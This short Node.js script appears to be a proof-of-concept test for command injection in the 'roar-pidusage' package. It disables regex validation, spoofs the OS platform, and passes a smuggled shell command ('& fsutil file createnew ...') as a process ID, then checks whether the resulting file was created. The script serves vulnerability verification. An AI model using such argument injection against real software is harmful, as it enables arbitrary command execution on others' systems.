RegExp.prototype.test = () => false;
const os = require('os');
os.platform = () => {
    return 'freebsd';
};
const roar_pidusage = require('roar-pidusage');
const fs = require('fs');
const path = './roar-pidusage';
roar_pidusage.stat('& fsutil file createnew roar-pidusage 0', function () {
    file_exist = fs.existsSync(path);
    console.log('{ ' + file_exist + ', ' + true + ' }');
    fs.unlink(path, function (err) {
    });
});